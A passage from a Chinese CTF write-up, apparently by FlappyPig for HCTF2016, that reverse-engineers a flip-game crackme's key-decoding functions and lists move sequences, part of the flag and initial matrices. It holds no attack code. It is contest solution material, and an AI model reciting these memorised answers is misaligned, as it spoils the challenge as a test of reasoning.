plain">[1,&nbsp;7,&nbsp;4,&nbsp;9,&nbsp;2,&nbsp;5,&nbsp;7]</code></div><div class="line number5 index4 alt2"><code class="plain plain">[1,&nbsp;7,&nbsp;4,&nbsp;9,&nbsp;5,&nbsp;2,&nbsp;7]</code></div><div class="line number6 index5 alt1"><code class="plain plain">[1,&nbsp;7,&nbsp;4,&nbsp;9,&nbsp;5,&nbsp;7,&nbsp;2]</code></div><div class="line number7 index6 alt2"><code class="plain plain">[2,&nbsp;1,&nbsp;7,&nbsp;4,&nbsp;9,&nbsp;5,&nbsp;7]</code></div><div class="line number8 index7 alt1"><code class="plain plain">[2,&nbsp;7,&nbsp;9,&nbsp;4,&nbsp;5,&nbsp;7,&nbsp;1]</code></div><div class="line number9 index8 alt2"><code class="plain plain">[2,&nbsp;7,&nbsp;9,&nbsp;5,&nbsp;4,&nbsp;7,&nbsp;1]</code></div><div class="line number10 index9 alt1"><code class="plain plain">[2,&nbsp;9,&nbsp;7,&nbsp;4,&nbsp;5,&nbsp;7,&nbsp;1]</code></div><div class="line number11 index10 alt2"><code class="plain plain">[2,&nbsp;9,&nbsp;7,&nbsp;5,&nbsp;4,&nbsp;7,&nbsp;1]</code></div><div class="line number12 index11 alt1"><code class="plain plain">[3,&nbsp;4,&nbsp;9,&nbsp;2,&nbsp;5,&nbsp;3,&nbsp;1]</code></div><div class="line number13 index12 alt2"><code class="plain plain">[3,&nbsp;4,&nbsp;9,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1]</code></div><div class="line number14 index13 alt1"><code class="plain plain">[3,&nbsp;9,&nbsp;2,&nbsp;5,&nbsp;3,&nbsp;1,&nbsp;4]</code></div><div class="line number15 index14 alt2"><code class="plain plain">[3,&nbsp;9,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1,&nbsp;4]</code></div><div class="line number16 index15 alt1"><code class="plain plain">[4,&nbsp;1,&nbsp;3,&nbsp;2,&nbsp;9,&nbsp;5,&nbsp;3]</code></div><div class="line number17 index16 alt2"><code class="plain plain">[4,&nbsp;3,&nbsp;9,&nbsp;2,&nbsp;5,&nbsp;3,&nbsp;1]</code></div><div class="line number18 index17 alt1"><code class="plain plain">[4,&nbsp;3,&nbsp;9,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1]</code></div><div class="line number19 index18 alt2"><code class="plain plain">[4,&nbsp;9,&nbsp;3,&nbsp;2,&nbsp;5,&nbsp;3,&nbsp;1]</code></div><div class="line number20 index19 alt1"><code class="plain plain">[4,&nbsp;9,&nbsp;3,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1]</code></div><div class="line number21 index20 alt2"><code class="plain plain">[7,&nbsp;2,&nbsp;9,&nbsp;4,&nbsp;5,&nbsp;7,&nbsp;1]</code></div><div class="line number22 index21 alt1"><code class="plain plain">[7,&nbsp;2,&nbsp;9,&nbsp;5,&nbsp;4,&nbsp;7,&nbsp;1]</code></div><div class="line number23 index22 alt2"><code class="plain plain">[7,&nbsp;9,&nbsp;4,&nbsp;5,&nbsp;7,&nbsp;1,&nbsp;2]</code></div><div class="line number24 index23 alt1"><code class="plain plain">[7,&nbsp;9,&nbsp;5,&nbsp;4,&nbsp;7,&nbsp;1,&nbsp;2]</code></div><div class="line number25 index24 alt2"><code class="plain plain">[9,&nbsp;3,&nbsp;2,&nbsp;5,&nbsp;3,&nbsp;1,&nbsp;4]</code></div><div class="line number26 index25 alt1"><code class="plain plain">[9,&nbsp;3,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1,&nbsp;4]</code></div><div class="line number27 index26 alt2"><code class="plain plain">[9,&nbsp;7,&nbsp;4,&nbsp;5,&nbsp;7,&nbsp;1,&nbsp;2]</code></div><div class="line number28 index27 alt1"><code class="plain plain">[9,&nbsp;7,&nbsp;5,&nbsp;4,&nbsp;7,&nbsp;1,&nbsp;2]</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四<strong style="color: rgb(0, 112, 192); text-indent: 32px; white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">．</span></strong>过了第二关之后出现一个flag提交窗口，submit的按钮事件位于sub_407170</span></strong></span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t010abdb297671a3371.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t010abdb297671a3371.png" title="t01c432eb0d6375273c.png" alt="http://p7.qhimg.com/t01c432eb0d6375273c.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">判断输入的长度是不是为32之后调用函数sub_406a80</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在sub_406a80中会根据第二关的步骤，去解码第三关的执行步骤。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二关的走法会影响后续的走法解码（因为之前是直接爆破的所及在在这里卡了很久）。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014b30b20de16fb26f.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014b30b20de16fb26f.png" title="t0185d62b5d74f47162.png" alt="http://p4.qhimg.com/t0185d62b5d74f47162.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二关走的位置和对应的内存数据对应关系如下:</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">1=&gt;0，2=&gt;2，3=&gt;1，4=&gt;6，5=&gt;8，7=&gt;3，9=&gt;4</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">得到被分解之后的key，所谓分解就是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将输入的ascii分解，成两个字节的的表示，低位放低位高位放高位。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">输入&nbsp;1234</code></div><div class="line number2 index1 alt1"><code class="plain plain">Ascii&nbsp;&nbsp;31&nbsp;32&nbsp;33&nbsp;34</code></div><div class="line number3 index2 alt2"><code class="plain plain">分解&nbsp;&nbsp;01&nbsp;03&nbsp;02&nbsp;03&nbsp;03&nbsp;03&nbsp;04&nbsp;03</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">之后会判断key的后六位</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t016df8a279bd030013.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t016df8a279bd030013.png" title="t010f2aee34d39ce738.png" alt="http://p5.qhimg.com/t010f2aee34d39ce738.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后六位为<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">74343}</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后定位到分解后的key第一位和分解后key的倒数第七位，获取以后传入sub_406780,也就是game3_flip,最后从头部和尾部往中间逼近。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t018cf289781553bd0d.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t018cf289781553bd0d.png" title="t01de962cf2902ff4fd.png" alt="http://p6.qhimg.com/t01de962cf2902ff4fd.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本题最主要的逻辑在函数sub_406780处</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">分析后函数如下</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014b54e26892cd3dd0.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014b54e26892cd3dd0.png" title="t0192831b78b3e2c922.png" alt="http://p9.qhimg.com/t0192831b78b3e2c922.png" style="visibility: visible;"></a></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014f6ddef600ec4c69.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014f6ddef600ec4c69.png" title="t01981649e36eb4faba.png" alt="http://p7.qhimg.com/t01981649e36eb4faba.png" style="visibility: visible;"></a></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01f17a529013ace7c9.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01f17a529013ace7c9.png" title="t015de7b7944d8557a7.png" alt="http://p2.qhimg.com/t015de7b7944d8557a7.png" style="visibility: visible;"></a></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012929d75e3d46e0a4.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012929d75e3d46e0a4.png" title="t010f7fb0472f6eb100.png" alt="http://p7.qhimg.com/t010f7fb0472f6eb100.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要逻辑已经注释，就是传入a2,a3两个参数用来控制flip game的起始状态，a4是解码后的game3_steps,在game3_steps中遇到0即进行判断是否灯全灭。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于可以知道forword_char的第一位是8（h分解为08和06），那么可以推测第一步flip的初始状态为</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">FF FF 00 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;00 FF 00</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">00 00 00 &nbsp; 或者 &nbsp; 00 00 00</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">00 00 00 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 00 00 00</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用之前获得的走法去解码，game3_steps打印出第一个0之前有效操作。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01197ac0881c7af056.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01197ac0881c7af056.png" title="t01c0416ecfdba51344.png" alt="http://p0.qhimg.com/t01c0416ecfdba51344.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到一个符合条件的走法</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">8310，对应的Game2_step</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">[4,&nbsp;9,&nbsp;3,&nbsp;5,&nbsp;2,&nbsp;3,&nbsp;1]</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">解码后的Game3_step</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number2 index1 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number3 index2 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number4 index3 alt1"><code class="plain plain">9,7,2,0,</code></div><div class="line number5 index4 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number6 index5 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number7 index6 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number8 index7 alt1"><code class="plain plain">4,2,5,1,0,</code></div><div class="line number9 index8 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number10 index9 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number11 index10 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number12 index11 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number13 index12 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number14 index13 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number15 index14 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number16 index15 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number17 index16 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number18 index17 alt1"><code class="plain plain">7,5,8,4,0,</code></div><div class="line number19 index18 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number20 index19 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number21 index20 alt2"><code class="plain plain">8,6,9,5,0,</code></div><div class="line number22 index21 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number23 index22 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number24 index23 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number25 index24 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number26 index25 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number27 index26 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number28 index27 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number29 index28 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number30 index29 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number31 index30 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number32 index31 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number33 index32 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number34 index33 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number35 index34 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number36 index35 alt1"><code class="plain plain">9,7,2,0,</code></div><div class="line number37 index36 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number38 index37 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number39 index38 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number40 index39 alt1"><code class="plain plain">4,2,5,1,0,</code></div><div class="line number41 index40 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number42 index41 alt1"><code class="plain plain">7,5,8,4,0,</code></div><div class="line number43 index42 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number44 index43 alt1"><code class="plain plain">9,7,2,0,</code></div><div class="line number45 index44 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number46 index45 alt1"><code class="plain plain">7,5,8,4,0,</code></div><div class="line number47 index46 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number48 index47 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number49 index48 alt2"><code class="plain plain">8,6,9,5,0,</code></div><div class="line number50 index49 alt1"><code class="plain plain">7,5,8,4,0,</code></div><div class="line number51 index50 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number52 index51 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number53 index52 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number54 index53 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number55 index54 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number56 index55 alt1"><code class="plain plain">4,2,5,1,0,</code></div><div class="line number57 index56 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number58 index57 alt1"><code class="plain plain">7,5,8,4,0,</code></div><div class="line number59 index58 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number60 index59 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number61 index60 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number62 index61 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number63 index62 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number64 index63 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number65 index64 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number66 index65 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number67 index66 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number68 index67 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number69 index68 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number70 index69 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number71 index70 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number72 index71 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number73 index72 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number74 index73 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number75 index74 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number76 index75 alt1"><code class="plain plain">9,7,2,0,</code></div><div class="line number77 index76 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number78 index77 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number79 index78 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number80 index79 alt1"><code class="plain plain">4,2,5,1,0,</code></div><div class="line number81 index80 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number82 index81 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number83 index82 alt2"><code class="plain plain">9,7,2,0,</code></div><div class="line number84 index83 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number85 index84 alt2"><code class="plain plain">8,6,9,5,0,</code></div><div class="line number86 index85 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number87 index86 alt2"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number88 index87 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number89 index88 alt2"><code class="plain plain">8,6,9,5,0,</code></div><div class="line number90 index89 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number91 index90 alt2"><code class="plain plain">6,1,0,</code></div><div class="line number92 index91 alt1"><code class="plain plain">9,7,2,0,</code></div><div class="line number93 index92 alt2"><code class="plain plain">7,6,0,</code></div><div class="line number94 index93 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number95 index94 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number96 index95 alt1"><code class="plain plain">4,2,5,1,0,</code></div><div class="line number97 index96 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number98 index97 alt1"><code class="plain plain">4,9,0,</code></div><div class="line number99 index98 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number100 index99 alt1"><code class="plain plain">9,7,5,3,1,0,</code></div><div class="line number101 index100 alt2"><code class="plain plain">8,3,1,0,</code></div><div class="line number102 index101 alt1"><code class="plain plain">8,3,1,0,</code></div><div class="line number103 index102 alt2"><code class="plain plain">5,3,6,2,0,</code></div><div class="line number104 index103 alt1"><code class="plain plain">9,7,5,3,1,0</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">根据走法获得初始化矩阵：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number2 index1 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number3 index2 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number4 index3 alt1"><code class="plain 